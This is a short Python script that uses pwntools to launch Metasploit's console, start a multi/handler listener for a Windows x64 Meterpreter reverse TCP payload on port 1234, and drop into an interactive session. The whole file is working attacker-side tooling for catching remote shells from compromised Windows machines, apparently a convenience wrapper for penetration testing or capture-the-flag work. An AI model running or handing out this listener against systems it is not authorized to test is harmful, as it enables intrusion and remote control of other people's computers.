#!/usr/bin/python3

from pwn import *

def clear_screen():
    io.send(b"\x1b[H\x1b[2J")
    
io = process(["msfconsole","-q"],stdin=PTY)
io.recvuntil(b">")
io.sendline(b"use exploit/multi/handler")
io.sendline(b"set payload windows/x64/meterpreter/reverse_tcp")
io.sendline(b"set lport 1234")
io.sendline(b"set lhost eth0")
clear_screen()
io.interactive()

